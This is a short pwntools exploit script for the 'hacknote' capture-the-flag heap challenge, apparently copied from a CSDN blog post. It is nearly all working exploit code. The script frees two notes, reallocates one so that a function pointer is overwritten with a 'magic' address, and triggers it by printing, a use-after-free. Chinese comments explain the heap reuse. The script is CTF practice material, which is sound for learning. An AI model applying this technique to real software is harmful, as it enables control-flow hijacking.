# https://blog.csdn.net/fzucaicai/article/details/129848265
from pwn import *

context(log_level='debug', arch='i386', os='linux')
r = process('./hacknote')

def addnote(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))


def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


magic = 0x08048986
system = 0x8048506

addnote(32, "ddaa")  # 0
addnote(32, "ddaa")  # 1
addnote(32, "ddaa")  # 2

gdb.attach(r)
pause()

delnote(0)
delnote(1)
pause()

addnote(8, p32(magic))  # 3 , 会申请 0x10 大小 复用对齐
"""
每个Add 创建2个heap
{
    *print_content(); -- 0x10
    *content;
}
del前两个后，就会有2个0x10的bin, 2个0x20的bin。
再次申请如果申请小的 0x10, 就会获得2个print_content。可以控制其中一个作为 *content 修改。
FILO  原则
后释放的先申请，那么
*print_content = #1
*content = #0
通过修改 content为 magic ,然后show(#0) 即可调用 magic

"""
printnote(0)
r.interactive()
